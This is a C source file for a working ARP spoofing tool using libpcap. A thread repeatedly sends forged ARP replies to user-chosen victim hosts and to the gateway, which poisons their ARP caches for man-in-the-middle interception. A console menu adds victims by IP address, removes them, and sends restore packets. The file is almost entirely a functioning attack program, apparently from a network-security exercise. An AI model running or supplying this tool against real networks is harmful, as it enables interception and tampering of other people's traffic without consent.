#include "std.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <pcap.h>
#include <pthread.h>
#include <unistd.h>
#include <linux/if_ether.h>
#include "PcapManager.h"
#include "GetNetworkInfo.h"
#include "AttackInfo.h"

extern BYTE gLocalMac[MAC_LEN];
extern BYTE gGatewayIp[IP_LEN];
extern BYTE gGatewayMac[MAC_LEN];
extern BYTE gLocalIp[IP_LEN];

int gIsArpSendThreadTerminate;

static void *ArpSenderThread(void *arg)
{
    pcap_t** handle = arg;
    BYTE packet[42];
    int i = 0;

    while (gIsArpSendThreadTerminate == 0)
    {
        for (i = 0; i < ATTACK_TABLE_MAX; i++)
        {
            if (gAttackInfoArr[i].set == 1)
            {
                // arp response to sender
                MakeArpReplyPacket(gLocalMac, gAttackInfoArr[i].mac, gLocalMac, gGatewayIp, gAttackInfoArr[i].ip, packet);
                pcap_sendpacket(*handle, packet, sizeof(packet));
                // arp response to receiver
                MakeArpReplyPacket(gLocalMac, gGatewayMac, gLocalMac, gAttackInfoArr[i].ip, gGatewayIp, packet);
                pcap_sendpacket(*handle, packet, sizeof(packet));
            }
        }

        sleep(1);
    }

    return 0;
}

void EndArpSpoof(pcap_t* handle, int userIdx)
{
    BYTE victimIp[IP_LEN];
    BYTE victimMac[MAC_LEN];
    BYTE packet[42];

    if (GetAttackInfo(userIdx, victimIp, victimMac) == 0)
    {
        PrintMac("restore ", victimMac, "\n");
        DeleteAttackInfo(userIdx);
        sleep(2);

        MakeArpReplyPacket(gLocalMac, victimMac, gGatewayMac, gGatewayIp, victimIp, packet);
        pcap_sendpacket(handle, packet, sizeof(packet));
        MakeArpReplyPacket(gLocalMac, gGatewayMac, victimMac, victimIp, gGatewayIp, packet);
        pcap_sendpacket(handle, packet, sizeof(packet));
    }
}

int main(int argc, char** argv)
{
    pcap_t* handle;
    BYTE victimIp[IP_LEN];
    BYTE victimMac[MAC_LEN];
    char userInput[20];

    printf("[*] Get default network information\n");

    if (GetLocalIpAddress(gLocalIp) == 0)
    {
        PrintIp("local IP address - ", gLocalIp, "\n");
    }
    else
    {
        printf("Get local IP adress fail\n");
        exit(-1);
    }

    if (GetLocalMacAddress(gLocalMac))
    {
        PrintMac("local MAC address - ", gLocalMac, "\n");
    }
    else
    {
        printf("Get local MAC address fail\n");
        exit(-1);
    }

    if (GetGatewayIp(gGatewayIp))
    {
        PrintIp("gateway IP - ", gGatewayIp, "\n");
    }
    else
    {
        printf("Get gateway IP fail\n");
        exit(-1);
    }

    if (GetMacAddressFromByte(gGatewayIp, gGatewayMac))
    {
        PrintMac("gateway MAC - ", gGatewayMac, "\n");
    }
    else
    {
        printf("get mac address fail\n");
        exit(-1);
    }

    if (InitPcap(&handle) == 0)
    {
        pthread_t threadId;
        pthread_attr_t attr;

	printf("[*] pcap thread execute success\n");

        if (pthread_attr_init(&attr) == 0 &&
            pthread_create(&threadId, &attr, &ArpSenderThread, &handle) == 0)
        {
            printf("[*] arp sender thread execute success\n");
        }
        else
        {
            pthread_attr_destroy(&attr);
            printf("arp sender thread execute fail\n");
            exit(-1);
        }


        while (1)
        {
            printf("1. add victim\n");
            printf("2. del victim\n");
            printf("3. exit\n");
            fgets(userInput, 20, stdin);

            if (userInput[0] == '1')
            {
                printf("input IP\n>>");
                fgets(userInput, 20, stdin);
                userInput[strlen(userInput) - 1] = '\0';

                if (!ConvertAddrToByteIp(userInput, victimIp))
                {
                    printf("invalid IP\n");
                    continue;
                }

                if (GetMacAddress(userInput, victimMac))
                {
                    PrintMac("[*] victim MAC - ", victimMac, "\n");
                }
                else
                {
                    printf("Get victim MAC address fail : Invalid IP address\n");
                    continue;
                }

                if (InsertAttackInfo(victimIp, victimMac))
                {
                    printf("ARP spoofing start to %s\n", userInput);
                }
            }
            else if (userInput[0] == '2') // send arp restore packet
            {
                PrintAttackInfo();
                printf("select number\n>>");
                fgets(userInput, 20, stdin);
                int num = atoi(userInput);
                EndArpSpoof(handle, num);
            }
            else if (userInput[0] == '3')
            {
                printf("[*] restore infected arp table\n");
                int i = 0;
                for (; i < ATTACK_TABLE_MAX; i++)
                {
                    EndArpSpoof(handle, 1);
                }
                break;
            }
        }

        pcap_breakloop(handle);
        pcap_close(handle);
        gIsArpSendThreadTerminate = 1;
        sleep(2);
        pthread_attr_destroy(&attr);
    }

    return 0;
}
